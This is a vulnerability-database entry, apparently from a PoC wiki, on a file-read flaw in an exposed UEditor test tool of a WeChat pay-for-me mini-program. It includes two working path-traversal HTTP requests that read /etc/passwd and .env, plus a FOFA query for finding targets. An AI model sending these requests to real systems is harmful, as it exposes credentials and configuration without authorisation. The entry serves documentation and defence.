---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "第三方代付微信小程序系统（厂商待核） UEditor测试工具read.php文件读取"
product: "第三方代付微信小程序系统（厂商待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，部署残留_test工具、PHP文件权限"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BE%8E%E5%9B%A2%E4%BB%A3%E4%BB%98%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%BE%8E%E5%9B%A2%E4%BB%A3%E4%BB%98%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F%20read.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/h5/static/js/chunk-vendors.js\""
fofa_unverified: "body="
id: "vw-90fe9f93058bf0525856674e"
entity_id: "ve-90fe9f93058bf0525856674e"
schema_version: "1"
---

# 第三方代付微信小程序系统（厂商待核） UEditor测试工具read.php文件读取

## 条目说明

- 对象与具体问题：第三方代付微信小程序系统（厂商待核）；UEditor测试工具read.php文件读取
- 版本、配置及部署条件：未知版本，部署残留_test工具、PHP文件权限
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 美团品牌关联未有官方产品证据，不能据标题认定美团官方系统漏洞
- 通用chunk-vendors.js指纹误报面大；根因更接近暴露编辑器测试文件
- 两相对路径层数依部署不同，截图未视检；在野利用及补丁无来源

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

美团代付微信小程序系统 read.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## 影响版本

美团代付微信小程序

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/h5/static/js/chunk-vendors.js"

POC/EXP：1

```http
POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

name=../../../../../../../../../etc/passwd
```


![image-20241109152458391](./.resource/美团代付微信小程序系统read.php任意文件读取漏洞/media/image-20241109152458391.png)


POC/EXP：2

```http
POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

name=../../../../../../.env
```


![image-20241109152707856](./.resource/美团代付微信小程序系统read.php任意文件读取漏洞/media/image-20241109152707856.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
